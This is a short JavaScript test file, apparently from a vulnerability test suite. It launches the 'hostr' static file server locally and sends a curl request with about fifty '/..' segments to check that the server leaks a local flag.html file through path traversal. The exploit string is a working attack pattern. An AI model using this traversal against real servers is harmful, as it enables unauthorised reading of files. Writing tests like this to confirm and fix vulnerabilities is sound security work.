//
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in hostr", (done) => {
    const fs = require("fs");
    const sleep =require('sleep');
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    let server = 'node ./node_modules/hostr/bin/hostr'; //to start the server
    exec(server, (error, stdout) => {});//starting the server

    sleep.sleep(2);
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:3000${genstr()}"`;

    exec(attack_string, (error, stdout) => {//attack
      expect(stdout).toBe(hostsFile);
      done();
    });
});
